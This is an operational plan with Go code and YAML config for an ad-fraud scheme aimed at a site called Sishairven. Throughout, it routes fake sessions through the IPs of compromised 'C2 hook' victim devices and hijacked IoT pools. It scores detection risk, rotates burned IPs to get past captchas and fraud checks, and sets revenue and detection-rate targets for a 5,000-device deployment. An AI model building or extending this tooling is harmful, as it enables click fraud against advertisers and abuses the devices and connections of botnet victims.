# Sishairven AdFraud Implementation Plan
## Phased Rollout with Device IP → Identity Gateway → IoT Pool Logic

**Version:** 1.0  
**Status:** IN PROGRESS  
**Current Phase:** Phase 1 - Foundation  
**Target:** Full 5K IoT device deployment  

---

## Core Architecture Principle

```
SESSION ROUTING LOGIC (Per Session):

┌─────────────────────────────────────────────────────────────────────────────┐
│  SESSION START                                                               │
│       │                                                                      │
│       ▼                                                                      │
│  ┌─────────────────┐                                                         │
│  │ Check Device IP │◄── Use C2 hook's device IP first (victim IP)          │
│  │ Available?      │    Safest - appears as normal user                    │
│  └────────┬────────┘                                                         │
│           │                                                                  │
│     ┌─────┴─────┐                                                            │
│     ▼           ▼                                                            │
│    YES          NO                                                           │
│     │            │                                                           │
│     ▼            ▼                                                           │
│ ┌─────────┐  ┌─────────────────┐                                             │
│ │ Route   │  │ Query Identity  │                                             │
│ │ via     │  │ Gateway         │                                             │
│ │ Device  │  │                 │                                             │
│ │ IP      │  └────────┬────────┘                                             │
│ └────┬────┘           │                                                      │
│      │                ▼                                                      │
│      │         ┌──────────────┐                                              │
│      │         │ IoT Pool     │                                              │
│      │         │ Available?   │                                              │
│      │         └──────┬───────┘                                              │
│      │                │                                                      │
│      │           ┌────┴────┐                                                 │
│      │           ▼         ▼                                                 │
│      │          YES        NO                                                │
│      │           │          │                                                │
│      │           ▼          ▼                                                │
│      │    ┌──────────┐  ┌─────────────┐                                      │
│      │    │ Route via│  │ Use Backup  │                                      │
│      │    │ IoT Proxy│  │ Residential │                                      │
│      │    │ (Rotating│  │ Proxy       │                                      │
│      │    │ Pool)    │  │ (External)  │                                      │
│      │    └────┬─────┘  └──────┬──────┘                                      │
│      │         │               │                                             │
│      └─────────┴───────────────┘                                             │
│                   │                                                          │
│                   ▼                                                          │
│            ┌──────────────┐                                                  │
│            │ Sishairven   │                                                  │
│            │ Target Site  │                                                  │
│            └──────────────┘                                                  │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Key Logic Rules

| Rule | Priority | Description |
|------|----------|-------------|
| **1. Device IP First** | P0 | First session attempt uses C2 hook's device IP |
| **2. Risk Threshold** | P1 | If risk > 65, immediately switch to Identity Gateway |
| **3. IP Burn Detection** | P1 | If device IP flagged, switch to IoT pool |
| **4. Session Rotation** | P2 | Every 3rd session rotates to new IP source |
| **5. Geographic Match** | P2 | Prefer IPs matching target's expected geo |

---

## Phase Overview

| Phase | Duration | Focus | Devices | Revenue Target |
|-------|----------|-------|---------|----------------|
| **Phase 1** | Week 1-2 | Foundation - Core logic, device IP routing | C2 hooks only | $1-5K/mo |
| **Phase 2** | Week 3-4 | Identity Gateway - IoT pool integration | 100-500 test | $10-20K/mo |
| **Phase 3** | Week 5-8 | Proxy Switching - Risk-based routing | 1,000 | $50-100K/mo |
| **Phase 4** | Week 9-12 | Scale - Full 5K deployment | 5,000 | $300-426K/mo |

---

## Phase 1: Foundation (Week 1-2)

### Goal
Build core session management with device IP fallback logic. No IoT devices needed yet.

### Components

#### 1.1 Session Router
```go
// File: clika-service/internal/adfraud/session_router.go

type SessionRouter struct {
    // IP Sources (in priority order)
    deviceIPPool    *DeviceIPPool      // C2 hook IPs (primary)
    identityGateway *IdentityGateway   // IoT pool (secondary)
    backupProxy     *BackupProxyPool   // External (tertiary)
    
    // Session tracking
    sessionHistory  map[string]*SessionSource
    riskMonitor     *RiskMonitor
}

type SessionSource int
const (
    SourceDeviceIP SessionSource = iota    // 0 - C2 hook device
    SourceIdentityGateway                  // 1 - IoT pool
    SourceBackupProxy                      // 2 - External
)

// RouteSession determines which IP source to use
func (r *SessionRouter) RouteSession(session *Session) (string, error) {
    // Rule 1: Check if device IP is available and healthy
    if r.deviceIPPool.IsHealthy(session.HookID) {
        // Check session history for this hook
        history := r.getSessionHistory(session.HookID)
        
        // First 2 sessions: use device IP
        if history.Count < 2 {
            return r.deviceIPPool.Assign(session.HookID)
        }
        
        // Every 3rd session: rotate to keep pattern natural
        if history.Count % 3 == 0 {
            return r.rotateToNextSource(session)
        }
        
        // Otherwise: continue with device IP if risk is low
        if session.RiskScore < 65 {
            return r.deviceIPPool.Assign(session.HookID)
        }
    }
    
    // Rule 2: Risk threshold exceeded or device IP unhealthy
    if session.RiskScore >= 65 {
        return r.identityGateway.AssignIP(session, PreferSameGeo)
    }
    
    // Rule 3: Device IP burned/unavailable
    if r.deviceIPPool.IsBurned(session.HookID) {
        return r.identityGateway.AssignIP(session, PreferSameGeo)
    }
    
    // Fallback: Use backup proxy
    return r.backupProxy.AssignIP()
}
```

#### 1.2 Device IP Pool
```go
// Manages C2 hook device IPs

type DeviceIPPool struct {
    mu sync.RWMutex
    
    // Active hooks and their IPs
    hooks map[string]*HookIP
    
    // Health tracking
    healthScores map[string]float64 // 0-100
    burnStatus   map[string]bool
}

type HookIP struct {
    HookID       string
    IP           string
    Geo          string
    ASN          string
    LastUsed     time.Time
    SessionCount int
    HealthScore  float64
    Burned       bool
}

func (p *DeviceIPPool) Assign(hookID string) (string, error) {
    p.mu.RLock()
    hook, exists := p.hooks[hookID]
    p.mu.RUnlock()
    
    if !exists {
        return "", fmt.Errorf("hook %s not registered", hookID)
    }
    
    if hook.Burned {
        return "", fmt.Errorf("hook %s IP is burned", hookID)
    }
    
    if hook.HealthScore < 50 {
        return "", fmt.Errorf("hook %s health too low", hookID)
    }
    
    // Update usage
    p.mu.Lock()
    hook.LastUsed = time.Now()
    hook.SessionCount++
    p.mu.Unlock()
    
    return hook.IP, nil
}

func (p *DeviceIPPool) ReportBurn(hookID string, reason string) {
    p.mu.Lock()
    defer p.mu.Unlock()
    
    if hook, exists := p.hooks[hookID]; exists {
        hook.Burned = true
        hook.HealthScore = 0
        log.Printf("[DeviceIP] Hook %s BURNED: %s", hookID, reason)
    }
}
```

#### 1.3 Session History Tracker
```go
// Tracks session source rotation per hook

type SessionHistory struct {
    HookID         string
    Sessions       []SessionRecord
    LastRotation   time.Time
    CurrentSource  SessionSource
}

type SessionRecord struct {
    SessionID   string
    Source      SessionSource
    IP          string
    Timestamp   time.Time
    Revenue     float64
    RiskScore   float64
}

func (h *SessionHistory) ShouldRotate() bool {
    // Rotate every 3 sessions
    if len(h.Sessions) % 3 == 0 && len(h.Sessions) > 0 {
        return true
    }
    
    // Or if last rotation was > 2 hours ago
    if time.Since(h.LastRotation) > 2*time.Hour {
        return true
    }
    
    return false
}

func (h *SessionHistory) GetNextSource() SessionSource {
    // Cycle: DeviceIP -> IdentityGateway -> DeviceIP
    switch h.CurrentSource {
    case SourceDeviceIP:
        return SourceIdentityGateway
    case SourceIdentityGateway:
        return SourceDeviceIP
    default:
        return SourceDeviceIP
    }
}
```

### Phase 1 Checklist

- [x] **1.1** Create `session_router.go` with routing logic ✅
- [x] **1.2** Create `device_ip_pool.go` for C2 hook IP management ✅
- [x] **1.3** Create `session_history.go` for rotation tracking ✅
- [ ] **1.4** Update `engine.go` to use SessionRouter
- [ ] **1.5** Add API endpoints for IP health reporting
- [ ] **1.6** Test: Verify device IP used for first 2 sessions
- [ ] **1.7** Test: Verify rotation on 3rd session
- [ ] **1.8** Test: Verify risk-based switching (>65)
- [ ] **1.9** Test: Verify burn detection
- [ ] **1.10** Document: Update implementation checklist ✅

### Phase 1 Status: IN PROGRESS (3/10 complete)

### Phase 1 Expected Behavior

```
Test Scenario 1: New Hook
├─ Session 1: Device IP ✓
├─ Session 2: Device IP ✓
├─ Session 3: Identity Gateway (rotation) ✓
├─ Session 4: Device IP ✓
└─ Session 5: Device IP ✓

Test Scenario 2: High Risk
├─ Session 1: Device IP ✓
├─ Session 2: Risk score 70 → Switch to Identity Gateway ✓
└─ Session 3: Identity Gateway (risk still high) ✓

Test Scenario 3: IP Burn
├─ Session 1: Device IP ✓
├─ Session 2: Amazon captcha detected, IP marked burned ✓
└─ Session 3: Identity Gateway (device IP burned) ✓
```

---

## Phase 2: Identity Gateway Integration (Week 3-4)

### Goal
Integrate Identity Gateway for IoT pool access. Deploy 100-500 test devices.

### Components

#### 2.1 Identity Gateway Client
```go
// File: clika-service/internal/adfraud/identity_gateway.go

type IdentityGateway struct {
    endpoint    string
    apiKey      string
    
    // IoT Pool cache
    iotPool     map[string]*IoTDevice
    geoIndex    map[string][]*IoTDevice // geo -> devices
    
    lastSync    time.Time
}

type IoTDevice struct {
    DeviceID    string
    IP          string
    Geo         string // "US-NYC", "CA-TOR", etc.
    Metro       string
    ISP         string
    ASN         string
    Available   bool
    LastUsed    time.Time
    SessionCount int
}

func (g *IdentityGateway) AssignIP(session *Session, prefer PreferOption) (string, error) {
    targetGeo := g.inferTargetGeo(session)
    
    // Find available device in target geo
    devices := g.geoIndex[targetGeo]
    
    for _, device := range devices {
        if g.isAvailable(device) {
            device.LastUsed = time.Now()
            device.SessionCount++
            return device.IP, nil
        }
    }
    
    // Fallback: any available device
    for _, device := range g.iotPool {
        if g.isAvailable(device) {
            device.LastUsed = time.Now()
            device.SessionCount++
            return device.IP, nil
        }
    }
    
    return "", fmt.Errorf("no IoT devices available")
}

func (g *IdentityGateway) isAvailable(device *IoTDevice) bool {
    if !device.Available {
        return false
    }
    
    // Cooldown: 20 minutes between sessions
    if time.Since(device.LastUsed) < 20*time.Minute {
        return false
    }
    
    // Daily limit: 34 sessions (Tier 1 target)
    if device.SessionCount >= 34 {
        return false
    }
    
    return true
}
```

#### 2.2 Geo-Matching Logic
```go
type PreferOption int
const (
    PreferSameGeo PreferOption = iota
    PreferSameCountry
    PreferAny
)

func (g *IdentityGateway) inferTargetGeo(session *Session) string {
    // Get target URL from session
    targetURL := session.EntryURL
    
    // Extract geo intent from URL
    // e.g., /shop → US (primary market)
    //       (future: /uk/shop → UK)
    
    return "US" // Default for sishairven
}

func (g *IdentityGateway) findClosestDevice(targetGeo string, devices []*IoTDevice) *IoTDevice {
    // Match by metro area first
    for _, d := range devices {
        if d.Geo == targetGeo {
            return d
        }
    }
    
    // Match by country
    targetCountry := strings.Split(targetGeo, "-")[0]
    for _, d := range devices {
        if strings.HasPrefix(d.Geo, targetCountry) {
            return d
        }
    }
    
    // Any available
    for _, d := range devices {
        if g.isAvailable(d) {
            return d
        }
    }
    
    return nil
}
```

### Phase 2 Checklist

- [ ] **2.1** Create `identity_gateway.go` client
- [ ] **2.2** Add geo-matching logic
- [ ] **2.3** Implement device availability checking
- [ ] **2.4** Add Identity Gateway sync (every 5 minutes)
- [ ] **2.5** Create test device pool (100 devices)
- [ ] **2.6** Test: Verify geo-matching works
- [ ] **2.7** Test: Verify 20-minute cooldown enforced
- [ ] **2.8** Test: Verify daily session limits
- [ ] **2.9** Test: Verify fallback to any geo
- [ ] **2.10** Deploy 500 test devices

---

## Phase 3: Proxy Switching & Risk Management (Week 5-8)

### Goal
Implement intelligent proxy switching based on risk scores and real-time monitoring.

### Components

#### 3.1 Risk-Based Router
```go
// Enhanced routing with risk thresholds

func (r *SessionRouter) RouteWithRisk(session *Session) (string, SessionSource, error) {
    // Calculate current risk
    risk := r.riskMonitor.CalculateRisk(session)
    session.RiskScore = risk
    
    // Risk-based routing
    switch {
    case risk < 40:
        // Low risk: Use device IP (most natural)
        ip, err := r.deviceIPPool.Assign(session.HookID)
        if err == nil {
            return ip, SourceDeviceIP, nil
        }
        // Fall through
        
    case risk < 65:
        // Medium risk: Use device IP with caution
        // Or rotate to Identity Gateway
        if r.shouldRotate(session) {
            ip, err := r.identityGateway.AssignIP(session, PreferSameGeo)
            if err == nil {
                return ip, SourceIdentityGateway, nil
            }
        }
        ip, err := r.deviceIPPool.Assign(session.HookID)
        if err == nil {
            return ip, SourceDeviceIP, nil
        }
        // Fall through
        
    case risk < 85:
        // High risk: Force Identity Gateway
        ip, err := r.identityGateway.AssignIP(session, PreferSameCountry)
        if err == nil {
            return ip, SourceIdentityGateway, nil
        }
        // Fall through
        
    default:
        // Critical risk: Burn session, use backup
        r.burnSession(session)
        ip, err := r.backupProxy.AssignIP()
        return ip, SourceBackupProxy, err
    }
}
```

#### 3.2 Real-Time Risk Monitor
```go
type RiskMonitor struct {
    // Risk factors
    clickVelocity    map[string][]time.Time // session -> click times
    captchaCount     map[string]int
    conversionRate   map[string]float64
    
    // Thresholds
    thresholds       RiskThresholds
}

type RiskThresholds struct {
    ClicksPerMinute     int
    CaptchasPerHour     int
    MinConversionRate   float64
    MaxConversionRate   float64
}

func (m *RiskMonitor) CalculateRisk(session *Session) float64 {
    var risk float64
    
    // Factor 1: Click velocity
    clicks := m.clickVelocity[session.ID]
    recentClicks := m.countRecent(clicks, 1*time.Minute)
    if recentClicks > m.thresholds.ClicksPerMinute {
        risk += float64(recentClicks-m.thresholds.ClicksPerMinute) * 5
    }
    
    // Factor 2: Captcha frequency
    if m.captchaCount[session.ID] > m.thresholds.CaptchasPerHour {
        risk += float64(m.captchaCount[session.ID]) * 10
    }
    
    // Factor 3: Conversion rate anomaly
    convRate := m.conversionRate[session.ID]
    if convRate > m.thresholds.MaxConversionRate {
        // Too high = suspicious
        risk += (convRate - m.thresholds.MaxConversionRate) * 50
    }
    if convRate < m.thresholds.MinConversionRate && session.ClickCount > 10 {
        // Too low = low quality, switch IP
        risk += 20
    }
    
    // Cap at 100
    if risk > 100 {
        risk = 100
    }
    
    return risk
}
```

### Phase 3 Checklist

- [ ] **3.1** Implement risk-based routing logic
- [ ] **3.2** Create real-time risk monitor
- [ ] **3.3** Add click velocity tracking
- [ ] **3.4** Add captcha frequency tracking
- [ ] **3.5** Add conversion rate monitoring
- [ ] **3.6** Test: Verify low risk (<40) uses device IP
- [ ] **3.7** Test: Verify medium risk (40-65) rotates
- [ ] **3.8** Test: Verify high risk (65-85) forces IoT
- [ ] **3.9** Test: Verify critical risk (>85) burns session
- [ ] **3.10** Scale to 1,000 devices

---

## Phase 4: Full Scale Deployment (Week 9-12)

### Goal
Deploy full 5,000 IoT device network with automated scaling and monitoring.

### Components

#### 4.1 Auto-Scaler
```go
type AutoScaler struct {
    targetRevenue    float64 // $426,000/month
    currentRevenue   float64
    
    // Scaling parameters
    minUtilization   float64 // 20%
    targetUtilization float64 // 35%
    maxUtilization   float64 // 50%
}

func (s *AutoScaler) Adjust() {
    utilization := s.calculateUtilization()
    
    switch {
    case utilization < s.minUtilization:
        // Scale up
        s.increaseSessions(10)
        
    case utilization > s.maxUtilization:
        // Scale down (safety)
        s.decreaseSessions(10)
        
    case utilization < s.targetUtilization:
        // Gradual increase
        s.increaseSessions(5)
    }
}
```

#### 4.2 Device Health Dashboard
```go
// Real-time device monitoring

type DeviceHealth struct {
    TotalDevices     int
    ActiveDevices    int
    BurnedDevices    int
    
    ByTier           map[string]TierHealth
    ByGeo            map[string]GeoHealth
    
    SessionVolume    int // sessions/hour
    RevenueRate      float64 // $/hour
}
```

### Phase 4 Checklist

- [ ] **4.1** Implement auto-scaler
- [ ] **4.2** Create health dashboard
- [ ] **4.3** Deploy full 5,000 device pool
- [ ] **4.4** Configure all 30 metro areas
- [ ] **4.5** Set up 24/7 monitoring
- [ ] **4.6** Test: Verify $14,200/day target
- [ ] **4.7** Test: Verify < 8% detection rate
- [ ] **4.8** Test: Verify 4% IP burn rate
- [ ] **4.9** Document: Final runbook
- [ ] **4.10** Document: Emergency procedures

---

## Configuration Files

### Session Router Config
```yaml
# clika-service/config/session_router.yaml

routing:
  priority_order:
    - device_ip      # First 2 sessions
    - identity_gateway # Rotation & high risk
    - backup_proxy   # Fallback

rotation:
  every_n_sessions: 3
  force_after_minutes: 120

risk_thresholds:
  low: 40           # Use device IP
  medium: 65        # Consider rotation
  high: 85          # Force IoT proxy
  critical: 95      # Burn session

device_ip:
  max_sessions_per_hook: 10
  cooldown_minutes: 30
  health_threshold: 50

identity_gateway:
  sync_interval: 5m
  geo_match_priority: true
  daily_session_limit: 34
  cooldown_minutes: 20
```

---

## Current Status

### Completed ✅
- [x] Documentation created
- [x] Phase 1 plan defined
- [x] Architecture designed
- [x] Session router implementation
- [x] Device IP pool implementation
- [x] Session history tracker

### In Progress 🔄
- [ ] Phase 1.4: Wire SessionRouter into engine
- [ ] Phase 1.5: API endpoints for health reporting
- [ ] Phase 1.6-1.9: Testing

### Pending ⏳
- [ ] Phase 2: Identity Gateway integration
- [ ] Phase 3: Risk-based switching
- [ ] Phase 4: Full scale deployment

---

**Next Action:** Begin Phase 1.1 - Create `session_router.go`
